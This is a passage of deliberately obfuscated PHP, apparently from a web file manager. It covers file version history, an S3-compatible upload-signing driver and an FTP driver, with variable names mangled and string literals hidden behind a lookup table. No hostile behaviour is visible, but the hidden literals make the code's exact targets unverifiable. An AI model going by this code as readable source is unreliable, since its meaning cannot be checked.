IO::rename($×ÌÍã[$¼¨ô­Ì£[76]], $á´İğŸÜ[1]); } } public static function eventBeforeMove($×¨Ğ¦‡¶) { $“ÄÖº† =& $_SERVER[¥ÙÌÜ¾ê]; $ù“‘ñâ = self::parsePath($×¨Ğ¦‡¶[0]); if (!$ù“‘ñâ) { return; } $á…Äƒ«” = self::parsePath($×¨Ğ¦‡¶[1]); if (!$á…Äƒ«”) { return; } $í¼½ÊÒ¼ = $×¨Ğ¦‡¶[3]; $Óú«øé = self::checkInHistory($ù“‘ñâ); if (!$Óú«øé) { return; } $È¨´ÔÇÍ = self::pathHistory($á…Äƒ«”); if ($Óú«øé[$“ÄÖº†[29]] == $“ÄÖº†[193]) { $à“Šñê§ = self::listData($ù“‘ñâ); $‚É³öµ  = rtrim($á…Äƒ«”, $“ÄÖº†[8]) . $“ÄÖº†[8] . ($í¼½ÊÒ¼ ? $í¼½ÊÒ¼ : get_path_this($ù“‘ñâ)); $ñ’ş‰Œò = self::listData($‚É³öµ ); if ($à“Šñê§ && $à“Šñê§[$“ÄÖº†[367]] && $ñ’ş‰Œò && $ñ’ş‰Œò[$“ÄÖº†[367]]) { return self::clear($ù“‘ñâ); } if ($à“Šñê§ && $à“Šñê§[$“ÄÖº†[367]]) { self::moveHistory($ù“‘ñâ, $í¼½ÊÒ¼, $È¨´ÔÇÍ); } } else { IO::move($Óú«øé[$“ÄÖº†[76]], $È¨´ÔÇÍ, !1, $í¼½ÊÒ¼); self::clearEmptyFolder(IO::pathFather($Óú«øé[$“ÄÖº†[76]])); } } public static function eventAfterRemove($ãööùı, $ØáåÊ´Õ) { $ïÆ÷•í =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ØáåÊ´Õ) { return; } $¯şÀäô = self::parsePath($ãööùı[0]); if (!$¯şÀäô) { return; } $ªÛî•íš = self::checkInHistory($¯şÀäô); if (!$ªÛî•íš) { return; } if ($ªÛî•íš[$ïÆ÷•í[29]] == $ïÆ÷•í[193]) { $Ò™›Ş¿´ = self::listData($¯şÀäô, !1); if ($Ò™›Ş¿´ && $Ò™›Ş¿´[$ïÆ÷•í[367]]) { self::clear($¯şÀäô, !1); } } else { IO::remove($ªÛî•íš[$ïÆ÷•í[76]]); self::clearEmptyFolder(IO::pathFather($ªÛî•íš[$ïÆ÷•í[76]])); } } private static function checkInHistory($ç–ù±Ì‰) { $˜­©à = self::pathHistory($ç–ù±Ì‰); if (!IO::exist($˜­©à)) { $˜­©à .= $_SERVER[¥ÙÌÜ¾ê][1153]; } return IO::exist($˜­©à) ? IO::info($˜­©à) : !1; } private static function parsePath($¹’ã) { $ÒÃÕØÆ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¹’ã) { return !1; } if ($GLOBALS[$ÒÃÕØÆ[1154]]) { return; } $¤Á·’ßÇ = KodIO::parse($¹’ã); $ñõ²ŠÔƒ = $¤Á·’ßÇ[$ÒÃÕØÆ[29]]; $í·±Úˆµ = !$ñõ²ŠÔƒ || $ñõ²ŠÔƒ == KodIO::KOD_IO || $ñõ²ŠÔƒ == KodIO::KOD_SHARE_ITEM; if (!$í·±Úˆµ || !$¤Á·’ßÇ[$ÒÃÕØÆ[1155]]) { return !1; } if (substr($¹’ã, 0, strlen(DATA_PATH . $ÒÃÕØÆ[1156])) == DATA_PATH . $ÒÃÕØÆ[1156]) { return !1; } if ($ñõ²ŠÔƒ == KodIO::KOD_SHARE_ITEM) { $çÄÎÖôì = IO::init($¹’ã); if ($çÄÎÖôì->pathParse[$ÒÃÕØÆ[1083]]) { return self::parsePath($çÄÎÖôì->pathParse[$ÒÃÕØÆ[1083]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $‹¥ª“˜¼ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ÒÃÕØÆ[1157]); foreach ($‹¥ª“˜¼ as $ÛÎÃá«) { if (!$ñõ²ŠÔƒ && substr($¹’ã, 0, strlen($ÛÎÃá«)) == $ÛÎÃá«) { return !1; } } self::log($GLOBALS[$ÒÃÕØÆ[1078]] . $ÒÃÕØÆ[1158] . $¹’ã); return $¹’ã; } private static function pathHistory($ë£‹šÍ©) { $ãÄÈÛŒİ =& $_SERVER[¥ÙÌÜ¾ê]; $Ã·ú = self::$_historyBase . ltrim(KodIO::clear($ë£‹šÍ©), $ãÄÈÛŒİ[8]); $Ã·ú = str_replace(array($ãÄÈÛŒİ[1159]), array($ãÄÈÛŒİ[1160]), $Ã·ú); return $Ã·ú; } public static function log($©ÆéÒâ) { } public static function historyCount($ì˜Ï®å) { $şÓ¾ø™Ö =& $_SERVER[¥ÙÌÜ¾ê]; $‰ÒÖ¸™ô = array(); $½³²¨ÉÉ = array(); foreach ($ì˜Ï®å as $Û×å£–¦) { $ãÕ±×§± = get_path_father($Û×å£–¦); if (!$½³²¨ÉÉ[$ãÕ±×§±]) { $½³²¨ÉÉ[$ãÕ±×§±] = array(); } $½³²¨ÉÉ[$ãÕ±×§±][] = get_path_this($Û×å£–¦); } foreach ($½³²¨ÉÉ as $ãÕ±×§± => $²õ«¤Ú) { $¨ê—¬¬„ = self::parsePath($ãÕ±×§±); if (!$¨ê—¬¬„) { continue; } foreach ($²õ«¤Ú as $é´ŒŸÖ) { $¼Üå‘ç = self::listData(rtrim($¨ê—¬¬„, $şÓ¾ø™Ö[8]) . $şÓ¾ø™Ö[8] . $é´ŒŸÖ, !1); if ($¼Üå‘ç && $¼Üå‘ç[$şÓ¾ø™Ö[367]]) { $‰ÒÖ¸™ô[rtrim($ãÕ±×§±, $şÓ¾ø™Ö[8]) . $şÓ¾ø™Ö[8] . $é´ŒŸÖ] = count($¼Üå‘ç[$şÓ¾ø™Ö[367]]); } } } return $‰ÒÖ¸™ô; } public static function add($ñÊ¬İÙœ) { $Õ¡½üûÌ =& $_SERVER[¥ÙÌÜ¾ê]; $‹¸äøñ» = self::listData($ñÊ¬İÙœ); if (!$‹¸äøñ») { return; } $·„¢ÀŠÆ = Model($Õ¡½üûÌ[763])->get($Õ¡½üûÌ[1161]); $Å˜¿›Íú = $GLOBALS[$Õ¡½üûÌ[6]][$Õ¡½üûÌ[88]][$Õ¡½üûÌ[1139]]; $Éì§¥Õİ = $·„¢ÀŠÆ == $Õ¡½üûÌ[1162] ? 5 : $Å˜¿›Íú; if ($Å˜¿›Íú <= 0) { return; } $÷ÌôÈ = IO::hashSimple($ñÊ¬İÙœ); $ç‡ï„âı = IO::info($ñÊ¬İÙœ); $æÃŠŒì° = $‹¸äøñ»[$Õ¡½üûÌ[367]]; if ($ç‡ï„âı[$Õ¡½üûÌ[78]] == 0) { return; } if ($ç‡ï„âı[$Õ¡½üûÌ[78]] >= 1024 * 1024 * 500) { return !1; } if ($æÃŠŒì° && $æÃŠŒì°[0][$Õ¡½üûÌ[171]] == $÷ÌôÈ) { return !0; } if (array_key_exists($Õ¡½üûÌ[196], $ç‡ï„âı) && !$ç‡ï„âı[$Õ¡½üûÌ[196]]) { return !1; } $æ§ƒ–‘Ø = short_id(time()); $ÜîÖ—Üá = array($Õ¡½üûÌ[395] => $æ§ƒ–‘Ø, $Õ¡½üûÌ[171] => $÷ÌôÈ, $Õ¡½üûÌ[28] => $ç‡ï„âı[$Õ¡½üûÌ[28]] . $Õ¡½üûÌ[95] . date($Õ¡½üûÌ[1163]) . rand_string(1), $Õ¡½üûÌ[78] => $ç‡ï„âı[$Õ¡½üûÌ[78]], $Õ¡½üûÌ[446] => USER_ID, $Õ¡½üûÌ[194] => time(), $Õ¡½üûÌ[1164] => $Õ¡½üûÌ[33]); IO::mkdir($‹¸äøñ»[$Õ¡½üûÌ[1165]]); $·ıã‹´Ä = IO::copy($ñÊ¬İÙœ, $‹¸äøñ»[$Õ¡½üûÌ[1165]], !1, $ÜîÖ—Üá[$Õ¡½üûÌ[28]]); if (!$·ıã‹´Ä) { self::clearEmptyFolder($‹¸äøñ»[$Õ¡½üûÌ[1165]]); return !1; } array_unshift($æÃŠŒì°, $ÜîÖ—Üá); if (count($æÃŠŒì°) > $Éì§¥Õİ) { $›¬Î•˜İ = array_slice($æÃŠŒì°, $Éì§¥Õİ); foreach ($›¬Î•˜İ as $û’Ãıã) { IO::remove($‹¸äøñ»[$Õ¡½üûÌ[1165]] . $û’Ãıã[$Õ¡½üûÌ[28]]); } $æÃŠŒì° = array_slice($æÃŠŒì°, 0, $Éì§¥Õİ); } return self::saveData($‹¸äøñ»[$Õ¡½üûÌ[1166]], $æÃŠŒì°); } public static function remove($•èÌ÷â‚, $ÁŒ‚Ñ”) { $‡ËÖ’¨× =& $_SERVER[¥ÙÌÜ¾ê]; $°ÅšÌ†¹ = self::listData($•èÌ÷â‚); $û†‰À”ú = array(); if (!$°ÅšÌ†¹) { return !1; } foreach ($°ÅšÌ†¹[$‡ËÖ’¨×[367]] as $ä×ÃÛ²ğ) { if ($ä×ÃÛ²ğ[$‡ËÖ’¨×[395]] == $ÁŒ‚Ñ”) { IO::remove($°ÅšÌ†¹[$‡ËÖ’¨×[1165]] . $ä×ÃÛ²ğ[$‡ËÖ’¨×[28]]); continue; } $û†‰À”ú[] = $ä×ÃÛ²ğ; } return self::saveData($°ÅšÌ†¹[$‡ËÖ’¨×[1166]], $û†‰À”ú); } public static function clear($òáûç¼, $áú×¨Ï = true) { $¤÷æ×¸€ =& $_SERVER[¥ÙÌÜ¾ê]; $ªòËñû = self::listData($òáûç¼, $áú×¨Ï); if (!$ªòËñû) { return !1; } foreach ($ªòËñû[$¤÷æ×¸€[367]] as $„¢àåÙÎ) { IO::remove($ªòËñû[$¤÷æ×¸€[1165]] . $„¢àåÙÎ[$¤÷æ×¸€[28]]); } return self::saveData($ªòËñû[$¤÷æ×¸€[1166]], array()); } public static function moveHistory($è¯Ú¡ Û, $‰ğ®¨ÏÂ = '', $€â×æ·³ = '') { $ñ»øÊÄ¯ =& $_SERVER[¥ÙÌÜ¾ê]; $‚ĞªŠìµ = self::listData($è¯Ú¡ Û, !1); if (!$‚ĞªŠìµ || !$‚ĞªŠìµ[$ñ»øÊÄ¯[367]]) { return !1; } $¡šîí = $ñ»øÊÄ¯[1153]; $‰ğ®¨ÏÂ = $‰ğ®¨ÏÂ ? $‰ğ®¨ÏÂ : get_path_this($è¯Ú¡ Û); $€â×æ·³ = $€â×æ·³ ? $€â×æ·³ : $‚ĞªŠìµ[$ñ»øÊÄ¯[1165]]; $é¿ËÓ¶ = substr(get_path_this($‚ĞªŠìµ[$ñ»øÊÄ¯[1166]]), 0, -strlen($¡šîí)); foreach ($‚ĞªŠìµ[$ñ»øÊÄ¯[367]] as $…Èıœ„Î => $¼™êôÏ) { $­ı·Üìä = $‰ğ®¨ÏÂ . substr($¼™êôÏ[$ñ»øÊÄ¯[28]], strlen($é¿ËÓ¶)); $ï¿ÒË  = IO::move($‚ĞªŠìµ[$ñ»øÊÄ¯[1165]] . $¼™êôÏ[$ñ»øÊÄ¯[28]], $€â×æ·³, !1, $­ı·Üìä); if ($ï¿ÒË ) { $‚ĞªŠìµ[$ñ»øÊÄ¯[367]][$…Èıœ„Î][$ñ»øÊÄ¯[28]] = $­ı·Üìä; } } $‚ĞªŠìµ[$ñ»øÊÄ¯[1166]] = IO::move($‚ĞªŠìµ[$ñ»øÊÄ¯[1166]], $€â×æ·³, !1, $‰ğ®¨ÏÂ . $¡šîí); self::saveData($‚ĞªŠìµ[$ñ»øÊÄ¯[1166]], $‚ĞªŠìµ[$ñ»øÊÄ¯[367]]); self::clearEmptyFolder($‚ĞªŠìµ[$ñ»øÊÄ¯[1165]]); } public static function rollback($®œ™‡”º, $íéï–›) { $¾ş““‚ =& $_SERVER[¥ÙÌÜ¾ê]; $åìŸÙ™‹ = self::listData($®œ™‡”º); if (!$åìŸÙ™‹) { return; } $¨ˆåÎ½á = IO::info($®œ™‡”º); foreach ($åìŸÙ™‹[$¾ş““‚[367]] as $Çûéë» => $ã˜ƒ®ìí) { if ($ã˜ƒ®ìí[$¾ş““‚[395]] == $íéï–›) { self::add($®œ™‡”º); $Ÿô’İ„Ç = $åìŸÙ™‹[$¾ş““‚[1165]] . $ã˜ƒ®ìí[$¾ş““‚[28]]; $«”Áöƒ = IO::copy($Ÿô’İ„Ç, IO::pathFather($®œ™‡”º), REPEAT_REPLACE, $¨ˆåÎ½á[$¾ş““‚[28]]); if ($«”Áöƒ) { self::remove($®œ™‡”º, $íéï–›); } return $«”Áöƒ; } } return !1; } public static function setDetail($ó‹İÛ×, $Îœî´ş, $çÈ¢¿™) { $Éë‡¾¼¤ =& $_SERVER[¥ÙÌÜ¾ê]; $Ì°¯ñ€á = self::listData($ó‹İÛ×); if (!$Ì°¯ñ€á) { return; } foreach ($Ì°¯ñ€á[$Éë‡¾¼¤[367]] as $”Ÿ€ûÕ› => $¢ïÓ»ïø) { if ($¢ïÓ»ïø[$Éë‡¾¼¤[395]] == $Îœî´ş) { $Ì°¯ñ€á[$Éë‡¾¼¤[367]][$”Ÿ€ûÕ›][$Éë‡¾¼¤[1164]] = $çÈ¢¿™; self::saveData($Ì°¯ñ€á[$Éë‡¾¼¤[1166]], $Ì°¯ñ€á[$Éë‡¾¼¤[367]]); return !0; } } return !1; } public static function fileInfo($ëá÷Î¸‹, $š„‘åŞ) { $ö€ŠĞà =& $_SERVER[¥ÙÌÜ¾ê]; $¹ÒŞ£â” = self::listData($ëá÷Î¸‹); if (!$¹ÒŞ£â”) { show_json(LNG($ö€ŠĞà[105]), !1); } $ú‘©Áß = $ö€ŠĞà[33]; foreach ($¹ÒŞ£â”[$ö€ŠĞà[367]] as $¹¾«Å => $›ÆÖŠ³§) { if ($›ÆÖŠ³§[$ö€ŠĞà[395]] != $š„‘åŞ) { continue; } $ú‘©Áß = $¹ÒŞ£â”[$ö€ŠĞà[1165]] . $›ÆÖŠ³§[$ö€ŠĞà[28]]; break; } if (!$ú‘©Áß) { show_json(LNG($ö€ŠĞà[105]), !1); } return IO::info($ú‘©Áß); } public static function fileOut($ÅÁı¬ö, $ÊŠ¥ä¾Ñ, $³’åÅúã = false) { $è”»˜Ôâ =& $_SERVER[¥ÙÌÜ¾ê]; $×ââñ× = self::fileInfo($ÅÁı¬ö, $ÊŠ¥ä¾Ñ); $±„¯êú =& $GLOBALS[$è”»˜Ôâ[7]]; $³’åÅúã = isset($±„¯êú[$è”»˜Ôâ[1129]]) && $±„¯êú[$è”»˜Ôâ[1129]] == 1; if (isset($±„¯êú[$è”»˜Ôâ[29]]) && $±„¯êú[$è”»˜Ôâ[29]] == $è”»˜Ôâ[1167]) { return IO::fileOutImage($×ââñ×[$è”»˜Ôâ[76]], $±„¯êú[$è”»˜Ôâ[1168]]); } IO::fileOut($×ââñ×[$è”»˜Ôâ[76]], $³’åÅúã, get_path_this($ÅÁı¬ö)); } public static function listData($ °ã¹Şø, $˜ú¹Ó¯ƒ = true) { $¶²ÉŸÒë =& $_SERVER[¥ÙÌÜ¾ê]; if ($˜ú¹Ó¯ƒ && !IO::exist($ °ã¹Şø)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ °ã¹Şø, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ÓÒÓô§ù = self::pathHistory($ °ã¹Şø); $Ù¡Ì£ú = array($¶²ÉŸÒë[1166] => $ÓÒÓô§ù . $¶²ÉŸÒë[1153], $¶²ÉŸÒë[1165] => rtrim(get_path_father($ÓÒÓô§ù), $¶²ÉŸÒë[8]) . $¶²ÉŸÒë[8], $¶²ÉŸÒë[367] => array()); $¶á‘‘·¶ = IO::getContent($Ù¡Ì£ú[$¶²ÉŸÒë[1166]]); if ($¶á‘‘·¶) { $·ÔÕ³ì½ = json_decode($¶á‘‘·¶, !0); if (is_array($·ÔÕ³ì½)) { $Ù¡Ì£ú[$¶²ÉŸÒë[367]] = $·ÔÕ³ì½; } } return $Ù¡Ì£ú; } private static function saveData($ş³¨ªù­, $¢¥ë°¨ì) { $Şş»‚Üî =& $_SERVER[¥ÙÌÜ¾ê]; self::log($Şş»‚Üî[1169] . $ş³¨ªù­ . $Şş»‚Üî[68] . count($¢¥ë°¨ì), $Şş»‚Üî[745]); if ($¢¥ë°¨ì) { return IO::setContent($ş³¨ªù­, json_encode($¢¥ë°¨ì)); } $ò‚ÀĞÇ• = IO::pathFather($ş³¨ªù­); IO::remove($ş³¨ªù­); self::clearEmptyFolder($ò‚ÀĞÇ•); return !0; } public static function clearEmptyFolder($ëö´°) { $ƒÉÚªæû =& $_SERVER[¥ÙÌÜ¾ê]; if (trim($ëö´°, $ƒÉÚªæû[8]) == trim(self::$_historyBase, $ƒÉÚªæû[8])) { return; } $ÅİÖ™£‰ = IO::pathFather($ëö´°); $§¨ƒ¤† = IO::has($ëö´°, !0); if ($§¨ƒ¤†[$ƒÉÚªæû[203]] > 0 || $§¨ƒ¤†[$ƒÉÚªæû[204]] > 0) { return; } IO::remove($ëö´°); self::clearEmptyFolder($ÅİÖ™£‰); } private static function getBasePath() { $ØÆíÀİĞ =& $_SERVER[¥ÙÌÜ¾ê]; $¸¥âò—Õ = Model($ØÆíÀİĞ[1170])->get($ØÆíÀİĞ[1171]); if ($¸¥âò—Õ) { if (!IO::exist($¸¥âò—Õ)) { IO::mkdir($¸¥âò—Õ); } if (get_path_this($¸¥âò—Õ) == $ØÆíÀİĞ[1156]) { $Œö§¥ğØ = $ØÆíÀİĞ[1172] . rand_string(8); @rename($¸¥âò—Õ, get_path_father($¸¥âò—Õ) . $ØÆíÀİĞ[8] . $Œö§¥ğØ); $¸¥âò—Õ = DATA_PATH . $Œö§¥ğØ . $ØÆíÀİĞ[8]; file_put_contents(DATA_PATH . $ØÆíÀİĞ[1173], $ØÆíÀİĞ[33]); Model($ØÆíÀİĞ[1170])->set($ØÆíÀİĞ[1171], $¸¥âò—Õ); } return $¸¥âò—Õ; } $¸¥âò—Õ = DATA_PATH . $ØÆíÀİĞ[1172] . rand_string(8) . $ØÆíÀİĞ[8]; $¸¥âò—Õ = IO::mkdir($¸¥âò—Õ); $¸¥âò—Õ = rtrim($¸¥âò—Õ, $ØÆíÀİĞ[8]) . $ØÆíÀİĞ[8]; file_put_contents($¸¥âò—Õ . $ØÆíÀİĞ[1173], $ØÆíÀİĞ[33]); file_put_contents(DATA_PATH . $ØÆíÀİĞ[1173], $ØÆíÀİĞ[33]); Model($ØÆíÀİĞ[1170])->set($ØÆíÀİĞ[1171], $¸¥âò—Õ); return $¸¥âò—Õ; } } goto A¯‰¬åµ÷; dÃŞİ¹“Û“: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ñ¼¾Ê‘¤) { parent::__construct($ñ¼¾Ê‘¤); $this->signatureVersion($_SERVER[¥ÙÌÜ¾ê][212]); } public function uploadFormData($îËšĞœ˜, $Ê¬‰Õê¤ = 3600) { $·‘ˆ÷‹ =& $_SERVER[¥ÙÌÜ¾ê]; $Ÿ‚±•‰­ = $·‘ˆ÷‹[192]; $ÍÆ¹ñ = $·‘ˆ÷‹[1272]; $Èß“˜àÌ = $·‘ˆ÷‹[59]; $Õ´‹Ş ü = gmdate($·‘ˆ÷‹[1273]); $‰®†àöı = gmdate($·‘ˆ÷‹[744]); $Ëí£»ü = $·‘ˆ÷‹[1274]; $ö’³ÑÀâ = $Ê¬‰Õê¤ . $·‘ˆ÷‹[33]; $”›“³ºÛ = $·‘ˆ÷‹[1236]; $û—ğöÍ = array($this->accessKey, $‰®†àöı, $this->region, $Èß“˜àÌ, $Ëí£»ü); $ÚøÍıÑÈ = implode($·‘ˆ÷‹[8], $û—ğöÍ); $Äç‰©ÓÌ = array($·‘ˆ÷‹[1238] => gmdate($·‘ˆ÷‹[1237], strtotime($·‘ˆ÷‹[1275])), $·‘ˆ÷‹[1239] => array(array($·‘ˆ÷‹[1241] => $this->bucket), array($·‘ˆ÷‹[1240] => $Ÿ‚±•‰­), array($·‘ˆ÷‹[1242], $·‘ˆ÷‹[1243], $·‘ˆ÷‹[33]), array($·‘ˆ÷‹[1242], $·‘ˆ÷‹[1276], $·‘ˆ÷‹[33]), array($·‘ˆ÷‹[1242], $·‘ˆ÷‹[1277], $·‘ˆ÷‹[33]), array($·‘ˆ÷‹[1244] => $”›“³ºÛ), array($·‘ˆ÷‹[1278] => $ÚøÍıÑÈ), array($·‘ˆ÷‹[1279] => $ÍÆ¹ñ), array($·‘ˆ÷‹[1280] => $Õ´‹Ş ü), array($·‘ˆ÷‹[1281] => $ö’³ÑÀâ))); $åøˆÅ = base64_encode(json_encode($Äç‰©ÓÌ)); $Ã·«·çë = hash_hmac($·‘ˆ÷‹[1282], $‰®†àöı, $·‘ˆ÷‹[1283] . $this->secret, !0); $úÄæˆ¢ = hash_hmac($·‘ˆ÷‹[1282], $this->region, $Ã·«·çë, !0); $İ‚Ää‘ = hash_hmac($·‘ˆ÷‹[1282], $Èß“˜àÌ, $úÄæˆ¢, !0); $‰³ û‚– = hash_hmac($·‘ˆ÷‹[1282], $Ëí£»ü, $İ‚Ää‘, !0); $ú†Ä©ÓÜ = hash_hmac($·‘ˆ÷‹[1282], $åøˆÅ, $‰³ û‚–); $ßñ‘†ã = array($·‘ˆ÷‹[211] => $·‘ˆ÷‹[33], $·‘ˆ÷‹[1284] => $·‘ˆ÷‹[33], $·‘ˆ÷‹[1240] => $Ÿ‚±•‰­, $·‘ˆ÷‹[1244] => $”›“³ºÛ, $·‘ˆ÷‹[1248] => $åøˆÅ, $·‘ˆ÷‹[1285] => $ÚøÍıÑÈ, $·‘ˆ÷‹[1286] => $ÍÆ¹ñ, $·‘ˆ÷‹[1287] => $Õ´‹Ş ü, $·‘ˆ÷‹[1288] => $ö’³ÑÀâ, $·‘ˆ÷‹[1289] => $ú†Ä©ÓÜ, $·‘ˆ÷‹[175] => $this->getHost()); return $ßñ‘†ã; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($ø»’èŠå) { parent::__construct(); if (count($ø»’èŠå) > 0) { $this->_init($ø»’èŠå); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ü´öĞ¤À) { $üÙš¨É“ =& $_SERVER[¥ÙÌÜ¾ê]; global $config; $this->appCharset = $config[$üÙš¨É“[1290]]; $this->systemCharset = $config[$üÙš¨É“[1291]]; if (isset($ü´öĞ¤À[$üÙš¨É“[1292]]) && $ü´öĞ¤À[$üÙš¨É“[1292]]) { $this->systemCharset = $ü´öĞ¤À[$üÙš¨É“[1292]]; } } public function iconvApp($Üàü¦¯¡) { return $this->iconvTo($Üàü¦¯¡, $this->systemCharset, $this->appCharset); } public function iconvSystem($ûğ©á­Ì) { return $this->iconvTo($ûğ©á­Ì, $this->appCharset, $this->systemCharset); } public function getPathOuter($±ûë˜€À) { $õÅôÙ„ô =& $_SERVER[¥ÙÌÜ¾ê]; $¼•ÔíÒÙ = $this->iconvApp($this->pathBase); $±ûë˜€À = $this->iconvApp($±ûë˜€À); if (substr($¼•ÔíÒÙ, 0, 2) == $õÅôÙ„ô[1293]) { $¼•ÔíÒÙ = BASIC_PATH . substr($¼•ÔíÒÙ, 2); } if (substr($±ûë˜€À, 0, 2) == $õÅôÙ„ô[1293]) { $±ûë˜€À = BASIC_PATH . substr($±ûë˜€À, 2); } $¼•ÔíÒÙ = KodIO::clear($¼•ÔíÒÙ); $±ûë˜€À = KodIO::clear($±ûë˜€À); $±ûë˜€À = substr($±ûë˜€À, strlen($¼•ÔíÒÙ)); if (empty($this->pathDriver)) { return $±ûë˜€À; } return $this->pathDriver . $õÅôÙ„ô[8] . ltrim($±ûë˜€À, $õÅôÙ„ô[8]); } private function _init($Óì‡İ² = array()) { $šå‰ú² =& $_SERVER[¥ÙÌÜ¾ê]; if (!function_exists($šå‰ú²[1294])) { throw new Exception(LNG($šå‰ú²[1295])); } $this->config = $Óì‡İ²; $this->charsetReset($Óì‡İ²); foreach ($Óì‡İ² as $Ş‰ğäÔÂ => $ÊÑºé™) { if (isset($this->{$Ş‰ğäÔÂ})) { $this->{$Ş‰ğäÔÂ} = $ÊÑºé™; } } return $this->_login($Óì‡İ²); } private function _login($ğ¥¬Ó¥®) { $š¸¾ŒÈ =& $_SERVER[¥ÙÌÜ¾ê]; static $š™ñÚ = array(); $øº”ºÂ = md5(json_encode($ğ¥¬Ó¥®)); if (isset($š™ñÚ[$øº”ºÂ])) { foreach ($š™ñÚ[$øº”ºÂ] as $‚´ÇÛæÇ => $’’ÈúÈÕ) { $this->{$‚´ÇÛæÇ} = $’’ÈúÈÕ; } return !0; } $… ±¡ÇÖ = parse_url(trim($this->server, $š¸¾ŒÈ[8])); $this->host = $… ±¡ÇÖ[$š¸¾ŒÈ[175]]; $Ÿ¯Çåğ‘ = isset($… ±¡ÇÖ[$š¸¾ŒÈ[174]]) && $… ±¡ÇÖ[$š¸¾ŒÈ[174]] == $š¸¾ŒÈ[1296] ? !0 : !1; $this->scheme = $Ÿ¯Çåğ‘ ? $š¸¾ŒÈ[1297] : $š¸¾ŒÈ[1298]; $this->port = isset($… ±¡ÇÖ[$š¸¾ŒÈ[176]]) ? $… ±¡ÇÖ[$š¸¾ŒÈ[176]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ŠÓÂÛì = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $÷£é”‰ = $this->pasv == $š¸¾ŒÈ[87] ? !0 : !1; @ftp_pasv($this->connect, $÷£é”‰); $š™ñÚ[$øº”ºÂ] = array($š¸¾ŒÈ[1299] => $this->connect, $š¸¾ŒÈ[175] => $this->host, $š¸¾ŒÈ[174] => $this->scheme, $š¸¾ŒÈ[176] => $this->port); return $ŠÓÂÛì; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ıêë‘Š¬, $˜¸ä = '', $‰å«•×Î = REPEAT_RENAME) { if ($this->setContent($ıêë‘Š¬, $˜¸ä)) { return $this->getPathOuter($ıêë‘Š¬); } return !1; } public function mkdir($â¯œ¹äí, $®é½ï = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $â¯œ¹äí = $this->iconvSystem($â¯œ¹äí); if ($this->_isFolder($â¯œ¹äí) || @ftp_mkdir($this->connect, $â¯œ¹äí)) { return $this->getPathOuter($â¯œ¹äí); } if (!$this->mkdir($this->pathFather($â¯œ¹äí))) { return !1; } if ($â¯œ¹äí = @ftp_mkdir($this->connect, $â¯œ¹äí)) { return $this->getPathOuter($â¯œ¹äí); } return !1; } public function copyFile($ÃÈÑ‡ù, $¼Øá±¡‹) { if (!$this->_isconn()) { return !1; } $·öìççê = $this->pathThis($this->iconvSystem($ÃÈÑ‡ù)); $†‹Šà­ƒ = $this->tempFile($·öìççê); $îº’’è¥ = $this->iconvApp($†‹Šà­ƒ); $this->download($ÃÈÑ‡ù, $îº’’è¥); $í¤ÃÚıÁ = $this->upload($¼Øá±¡‹, $îº’’è¥); $this->tempFileRemve($†‹Šà­ƒ); return $í¤ÃÚıÁ; } public function moveFile($­…†‰‹¬, $¬ı“µ³ã) { if (!$this->_isconn()) { return !1; } $­…†‰‹¬ = $this->iconvSystem($­…†‰‹¬); $¬ı“µ³ã = $this->iconvSystem($¬ı“µ³ã); $÷Ê¤©Ï„ = @ftp_rename($this->connect, $­…†‰‹¬, $¬ı“µ³ã); return $÷Ê¤©Ï„ ? $this->getPathOuter($¬ı“µ³ã) : !1; } public function delFile($´®‡»ôÂ) { if (!$this->_isconn()) { return !1; } $´®‡»ôÂ = $this->iconvSystem($´®‡»ôÂ); return @ftp_delete($this->connect, $´®‡»ôÂ); } public function delFolder($Ç„íŒ÷ü) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ŠÀñÄà = $ÂÏ‰ñâ = array(); $this->fileList($Ç„íŒ÷ü, $ŠÀñÄà, $ÂÏ‰ñâ, !0); $this->listItemCache = !0; foreach ($ÂÏ‰ñâ as $²«ªçÏÊ) { $‘Ü¯´± = $this->iconvSystem($²«ªçÏÊ[$_SERVER[¥ÙÌÜ¾ê][28]]); $ÆŸ–ë„Ğ = @ftp_delete($this->connect, $‘Ü¯´±); if (!$ÆŸ–ë„Ğ) { return !1; } } foreach ($ŠÀñÄà as $‘Ü¯´±) { $‘Ü¯´± = $this->iconvSystem($‘Ü¯´±); $ÆŸ–ë„Ğ = @ftp_rmdir($this->connect, $‘Ü¯´±); if (!$ÆŸ–ë„Ğ) { return !1; } } $Ç„íŒ÷ü = $this->iconvSystem($Ç„íŒ÷ü); return @ftp_rmdir($this->connect, $Ç„íŒ÷ü); } public function rename($¥ç»©, $ºåùıèœ) { $òôû‘›³ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->_isconn()) { return !1; } $¹è¥Í›» = $this->fileNameAuto($this->pathFather($¥ç»©), $ºåùıèœ); $¹è¥Í›» = $this->iconvSystem($¹è¥Í›»); $¥ç»© = $this->iconvSystem($¥ç»©); $ë…Şãöî = $this->pathFather($¥ç»©); $õÜÓôı¤ = rtrim($ë…Şãöî, $òôû‘›³[8]) . $òôû‘›³[8] . $¹è¥Í›»; $ÁõíŞ™ü = @ftp_rename($this->connect, $¥ç»©, $õÜÓôı¤); $õÜÓôı¤ = $this->iconvApp($õÜÓôı¤); return $ÁõíŞ™ü ? $this->getPathOuter($õÜÓôı¤) : !1; } private function folderInfo($¢˜ç¢Èà, $Ú˜ò·§ = false) { $ ¿ßÜäú =& $_SERVER[¥ÙÌÜ¾ê]; $ÍÌèõ‰ = array($ ¿ßÜäú[28] => $this->pathThis($¢˜ç¢Èà), $ 